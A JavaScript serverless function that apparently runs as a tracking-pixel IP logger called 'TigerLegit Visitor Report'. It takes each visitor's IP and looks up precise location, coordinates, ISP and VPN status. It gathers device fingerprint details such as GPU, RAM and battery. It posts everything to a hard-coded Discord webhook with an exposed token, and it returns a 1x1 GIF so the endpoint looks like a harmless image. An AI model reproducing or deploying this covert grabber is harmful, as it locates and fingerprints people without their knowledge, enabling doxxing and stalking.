exports.handler = async (event) => {
    const ip = event.headers['x-nf-client-connection-ip'] || 'unknown';
    const ua = event.headers['user-agent'] || 'unknown';
    const referer = event.headers['referer'] || 'Direct';
    const timestamp = new Date().toISOString();

    // Parse browser info sent from the page
    let browserInfo = {};
    try {
        if (event.body) {
            const body = JSON.parse(event.body);
            browserInfo = body.browserInfo || {};
        }
    } catch(e) {}

    // Geolocation + VPN/proxy detection
    let isVPN = false;
    let isProxy = false;
    let isDatacenter = false;
    let country = 'Unknown';
    let city = 'Unknown';
    let region = 'Unknown';
    let isp = 'Unknown';
    let org = 'Unknown';
    let asn = 'Unknown';
    let lat = '';
    let lon = '';
    let timezone = 'Unknown';
    let mobile = false;

    try {
        const resp = await fetch(`http://ip-api.com/json/${ip}?fields=proxy,hosting,country,city,regionName,isp,org,as,lat,lon,timezone,mobile,query`);
        const data = await resp.json();

        isVPN = data.proxy === true || data.hosting === true;
        isProxy = data.proxy === true;
        isDatacenter = data.hosting === true;
        country = data.country || 'Unknown';
        city = data.city || 'Unknown';
        region = data.regionName || 'Unknown';
        isp = data.isp || 'Unknown';
        org = data.org || 'Unknown';
        asn = data.as || 'Unknown';
        lat = data.lat || '';
        lon = data.lon || '';
        timezone = data.timezone || 'Unknown';
        mobile = data.mobile === true;
    } catch (err) {
        console.error('IP lookup failed', err);
    }

    const vpnStatus = isVPN ? '🚨 YES' : '✅ No';
    const vpnDetail = isDatacenter ? ' (Datacenter IP)' : isProxy ? ' (Proxy)' : ' (Residential)';

    const message = `**🔍 TigerLegit Visitor Report**\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `**🌐 IP:** \`${ip}\`\n` +
                    `**🛡️ VPN/Proxy:** ${vpnStatus}${vpnDetail}\n` +
                    `**📍 Location:** ${city}, ${region}, ${country}\n` +
                    `**📌 Coordinates:** ${lat}, ${lon}\n` +
                    `**⏰ Timezone:** ${timezone}\n` +
                    `**🏢 ISP:** ${isp}\n` +
                    `**🏭 Org:** ${org}\n` +
                    `**🔢 ASN:** ${asn}\n` +
                    `**📱 Mobile:** ${mobile ? 'Yes' : 'No'}\n` +
                    `**🖥️ Screen:** ${browserInfo.screen || 'Unknown'}\n` +
                    `**📱 Viewport:** ${browserInfo.viewport || 'Unknown'}\n` +
                    `**💻 Platform:** ${browserInfo.platform || 'Unknown'}\n` +
                    `**🧠 CPU Cores:** ${browserInfo.cores || 'Unknown'}\n` +
                    `**💾 RAM:** ${browserInfo.memory || 'Unknown'}\n` +
                    `**🎮 GPU:** ${browserInfo.gpu || 'Unknown'}\n` +
                    `**🌍 Language:** ${browserInfo.language || 'Unknown'}\n` +
                    `**🔌 Connection:** ${browserInfo.connectionType || 'Unknown'}\n` +
                    `**🔋 Battery:** ${browserInfo.batteryLevel || 'Unknown'} ${browserInfo.batteryCharging ? '(Charging)' : ''}\n` +
                    `**🍪 Cookies:** ${browserInfo.cookiesEnabled ? 'Enabled' : 'Disabled'}\n` +
                    `**📌 DNT:** ${browserInfo.doNotTrack || 'Unspecified'}\n` +
                    `**🕐 Local Time:** ${browserInfo.localTime || 'Unknown'}\n` +
                    `**🔗 Referrer:** ${referer}\n` +
                    `**🖥️ UA:** \`${ua.substring(0, 120)}\``;

    // Send to Discord
    try {
        await fetch('https://discord.com/api/webhooks/1525619686434279564/4WcjQ1_nAdgsHQtMRAXaww-wPg4vOwglWFwf3oTes7DpODl7I3sG1g129Vq1xr9_UNFZ', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message.substring(0, 2000) })
        });
    } catch (err) {
        console.error('Webhook failed', err);
    }

    return {
        statusCode: 200,
        headers: { 'Content-Type': 'image/gif' },
        body: 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
        isBase64Encoded: true
    };
};
